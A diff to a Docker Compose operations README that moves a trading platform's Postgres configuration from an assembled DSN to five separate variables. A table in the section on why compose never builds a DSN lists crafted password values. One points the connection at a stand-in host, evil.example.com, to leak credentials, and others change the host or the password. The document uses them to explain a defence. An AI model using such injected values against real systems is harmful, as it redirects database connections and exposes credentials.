@@ -20,8 +20,8 @@ cp ops/.env.example ops/.env         # 1. compose reads this — sets POSTGRES_P
 cp .env.example .env                 # 2. the app's own Settings AND every piece of host
                                       #    tooling (make migrate, tests/integration, a bare
                                       #    psql) read this — set the *same* password into
-                                      #    DATABASE_URL here (see "Postgres is on host port
-                                      #    5433" below for the exact host/port to use)
+                                      #    POSTGRES_PASSWORD here (see "Postgres is on host
+                                      #    port 5433" below for the exact host/port to use)
 make up      # creates data/L0 data/L1 data/L2, then docker compose up -d
 make logs    # follow both services
 make psql    # interactive shell on the container DB
@@ -54,8 +54,9 @@ itself it creates it owned by root, and the app runs as uid 1000.
 ## Postgres is on host port 5433, not 5432
 
 Inside the compose network the database is `postgres:5432` and that is what the app uses
-(`DATABASE_URL=postgresql://trading:<POSTGRES_PASSWORD>@postgres:5432/trading`, assembled by
-compose from `ops/.env`). The **host-side** publish is 5433, deliberately:
+(`POSTGRES_HOST=postgres`, `POSTGRES_PORT=5432`, and the user/password/db from `ops/.env` — five
+discrete variables, never an assembled DSN; see "Compose never builds a DSN" below). The
+**host-side** publish is 5433, deliberately:
 
 > This host already runs its own Postgres bound to `127.0.0.1:5432`. Docker will publish over
 > it on `0.0.0.0:5432` without complaint, but the kernel prefers the more specific bind, so a
@@ -66,13 +67,44 @@ So, for anything running on the host — `make migrate`, `tests/integration`, `p
 terminal — put this in your repo-root `.env`:
 
 ```
-DATABASE_URL=postgresql://trading:<same password as ops/.env's POSTGRES_PASSWORD>@localhost:5433/trading
+POSTGRES_HOST=localhost
+POSTGRES_PORT=5433
+POSTGRES_USER=trading
+POSTGRES_PASSWORD=<same password as ops/.env's POSTGRES_PASSWORD>
+POSTGRES_DB=trading
 ```
 
-`.env.example` ships the conventional `localhost:5432`, which is right on a host without its
-own Postgres; on this one it silently resolves to the wrong server. Set
-`POSTGRES_HOST_PORT=5432` (in `ops/.env` or the environment) to get the conventional mapping
-back once the host Postgres is gone.
+`.env.example` ships exactly that, with `POSTGRES_PORT=5433` already set for this host. Set
+`POSTGRES_HOST_PORT=5432` (in `ops/.env` or the environment) and move `POSTGRES_PORT` back to
+5432 to get the conventional mapping once the host Postgres is gone.
+
+## Compose never builds a DSN
+
+Neither `ops/docker-compose.yml` nor any `ops/*.sh` assembles a `postgresql://` string. That is a
+security property, not a style preference. Compose interpolation is textual substitution with no
+notion of URI grammar, so a template like
+`postgresql://${POSTGRES_USER}:${POSTGRES_PASSWORD}@postgres:5432/${POSTGRES_DB}` hands the
+*password* control over where the connection goes. Demonstrated against exactly that template:
+
+| `POSTGRES_PASSWORD` | What the DSN then parses to |
+|---|---|
+| `pw@evil.example.com:5432/otherdb` | `host='evil.example.com'` — the container sends its username and a prefix of its password **off-box**, to a host the password chose |
+| `pw/slash` | `host='trading'`, `user=None`, `password=None` |
+| `pw%40enc` | authenticates with a silently **different** password (`pw@enc`) |
+
+The five discrete variables have no such grammar: `Settings` reads them into `postgres_*` and
+`dataplatform.store.db.connect` passes them to psycopg as keyword arguments, so libpq gets the
+password verbatim and no character is ever escaped or reinterpreted (invariant #13).
+
+`DATABASE_URL` remains supported as an **explicit operator override** — for a managed Postgres
+that only hands out a connection string — and, when set, outranks all five. Whoever sets it owns
+percent-encoding any metacharacter in its password. Nothing in `ops/` manufactures one, and the
+`app` container is given `DATABASE_URL=""` explicitly so the *host* DSN an owner may keep in the
+repo-root `.env` cannot ride in through `env_file` and outrank the in-network parameters.
+
+`ops/backup.sh` and `ops/restore.sh` never see a DSN either: they `docker compose exec` into the
+postgres container and let `pg_dump`/`psql` use its own `$POSTGRES_USER`/`$POSTGRES_DB` over the
+local socket, which is also why they keep working when the compose defaults are overridden.
 
 ## Configuration
 
@@ -98,16 +130,16 @@ unset rather than standing up a database whose password is `git log`-visible for
 all read it and resolve to that project, never silently to the default one. Leaving it unset is
 exactly today's single-stack behaviour; nothing changes for anyone who does not need isolation.
 
-Whatever `POSTGRES_PASSWORD` you set, `DATABASE_URL` in the repo-root `.env` must embed the same
-value — host tooling (`make migrate`, `tests/integration`, a bare `psql`) connects on
-`localhost:5433` using that value, independently of what compose hands the `app` container over
-the network. There is no default for either file to fall back on, so the two are the same
-password written twice, not one password with an optional override; see "Running it" above.
+Whatever `POSTGRES_PASSWORD` you set, the repo-root `.env` must carry the same value — host
+tooling (`make migrate`, `tests/integration`, a bare `psql`) connects on `localhost:5433` using
+it, independently of what compose hands the `app` container over the network. There is no default
+for either file to fall back on, so the two are the same password written twice, not one password
+with an optional override; see "Running it" above.
 
 The repo-root `.env` *is* passed into the app container (`env_file`, `required: false`), so
-runtime settings the owner keeps there reach the process. `DATABASE_URL`, `DATA_ROOT` and `TZ`
-are set explicitly in the compose file and win over it — their host-side values would be wrong
-inside the container.
+runtime settings the owner keeps there reach the process. `POSTGRES_HOST`/`PORT`/`USER`/
+`PASSWORD`/`DB`, `DATABASE_URL`, `DATA_ROOT` and `TZ` are set explicitly in the compose file and
+win over it — their host-side values would be wrong inside the container.
 
 ## The data lake is a bind mount
 
@@ -149,9 +181,12 @@ readable, which is exactly what the container healthcheck relies on (see "The im
 ```bash
 docker compose -f ops/docker-compose.yml ps                      # postgres healthy, app healthy
 curl -s localhost:8000/health                                    # {"status":"OK", ...}
-docker compose -f ops/docker-compose.yml exec -T app \
-  python -c "import os,psycopg; print(psycopg.connect(os.environ['DATABASE_URL']).info.dsn)"
+docker compose -f ops/docker-compose.yml exec -T app python -c \
+  "from dataplatform.store.db import connect; print(connect().info.dsn)"
 ```
 
 The third command is the one that proves the app reaches Postgres *by service name*; a
-localhost DSN inside the container points at the container itself.
+localhost DSN inside the container points at the container itself. It goes through `connect()`
+rather than reading an environment variable because there is no DSN in the container's
+environment to read — that is the point (see "Compose never builds a DSN"). `info.dsn` is
+libpq's own view of the established connection and never includes the password.
